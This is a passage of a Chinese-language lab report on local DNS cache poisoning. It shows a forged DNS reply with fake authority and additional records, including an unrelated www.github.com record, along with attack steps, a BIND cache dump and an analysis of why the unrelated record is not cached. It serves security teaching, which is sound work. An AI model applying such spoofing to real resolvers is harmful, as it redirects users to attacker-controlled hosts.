;; AUTHORITY SECTION: 
hust.edu.cn. 259200 IN NS ns1.hust.edu.cn. 
hust.edu.cn. 259200 IN NS ns2.hust.edu.cn. 
;; ADDITIONAL SECTION: 
ns1.hust.edu.cn. 259200 IN A 201.91.180.3
ns2.hust.edu.cn. 259200 IN A 200.10.3.27
www.github.com. 259200 IN A 111.111.111.111
```

`ADDITIONAL SECTION`中：条目`ns1.hust.edu.cn`和`ns2.hust.edu.cn`与授权部分中的主机名相关。条目`www.github.com`与回复中的任何条目完全无关，但它为用户提供了帮助，因此他们无需查找`Github`的`IP`地址。请使用`Scapy`来进行这样的`DNS`欺骗回复。你的工作是报告成功缓存了哪些条目，以及哪些条目不会被缓存，请解释原因。

### 1.7.2 攻击过程

- 攻击程序仅在`local_dns_poisoning_attack.py`和`local_dns_poisoning_attack_auth.py`的基础上稍作修改，即在`www.hust.edu.cn`的伪造响应中添加一条附加记录，得到`local_dns_poisoning_attack_addi.py`。
- 清空`DNS`服务器的缓存后，在攻击机运行该程序进行攻击，在客户机使用`dig www.hust.edu.cn`进行请求。
- 转储并查看服务器的`DNS`缓存（见`dump_addi.db`），没有`www.github.com`对应的缓存：

```shell
root@DNS_Server:/# rndc dumpdb -cache
root@DNS_Server:/# cat /var/cache/bind/dump.db
;
; Start view _default
;
;
; Cache dump of view '_default' (cache _default)
;
$DATE 20220501134329
; authauthority
hust.edu.cn.		11756	IN NS	ns1.hust.edu.cn.
			11756	IN NS	ns2.hust.edu.cn.
; additional
ns1.hust.edu.cn.	11756	A	201.91.180.3
; additional
ns2.hust.edu.cn.	11756	A	200.10.3.27
; authanswer
www.hust.edu.cn.	11756	A	172.18.0.1
```

![1.7.1.没有www.github.com的缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012153496.png)

- 攻击过程获得的数据包见`1.7.1-针对附加部分.pcapng`，可见欺骗报文的确包含`www.github.com`对应的附加条目，因此推测该条目被服务器忽略了：

![1.7.2.附加部分的确有www.github.com对应的条目](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012147826.png)

### 1.7.3 结果分析

- 此时相当于在授权部分和附加部分均进行了伪造，附加部分的`ns1.hust.edu.cn`和`ns2.hust.edu.cn`显然是与授权部分有关的，而`www.github.com`显然是与授权部分无关的，因此`www.github.com`条目没有被缓存。
- 而结合`1.5.2 使用之前的攻击程序`中的现象，即使与授权部分相关的附加部分的`ns1.hust.edu.cn`和`ns2.hust.edu.cn`条目被缓存了，但`DNS`服务器在后续查询中仍然不会使用这些`IP`信息，仍会发出新的`DNS`请求获得`ns1.hust.edu.cn`和`ns2.hust.edu.cn`的真实`IP`，也即虽然`DNS`服务器缓存了这些信息，但它是不信任这部分由附加部分得到的信息的。
- 综合以上分析，附加部分的信息与授权部分是否有关仅仅影响该信息是否被缓存，无论与授权部分是否有关，`bind`都不信任附加部分的信息。

